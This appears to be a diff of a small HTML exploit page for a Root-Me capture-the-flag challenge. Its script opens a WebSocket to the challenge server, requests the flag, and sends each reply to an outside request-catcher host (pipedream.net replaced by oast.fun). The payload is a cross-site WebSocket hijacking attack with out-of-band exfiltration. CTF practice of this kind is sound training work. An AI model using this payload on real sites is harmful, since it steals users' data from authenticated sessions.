@@ -12,14 +12,14 @@
   <script>
    
       var ws = new WebSocket('ws://ctf15.root-me.org/ws');
-      ws.onopen = function () {
+      ws.onopen = () => {
         ws.send("flag");
-      };
+      }
       ws.onmessage = function (event) {
-        fetch("https://eoa21cz1z5v9xqj.m.pipedream.net/"+event["data"])
-          .then(function(res){ return res.json(); })
-          .then(function(data){ console.log(data) })
-      };
+        fetch("https://ceht4xb2vtc0000z5qegg8e7nqayyyyyb.oast.fun/"+event["data"])
+          .then()
+          .catch()
+      }
     
   </script>
 </body>
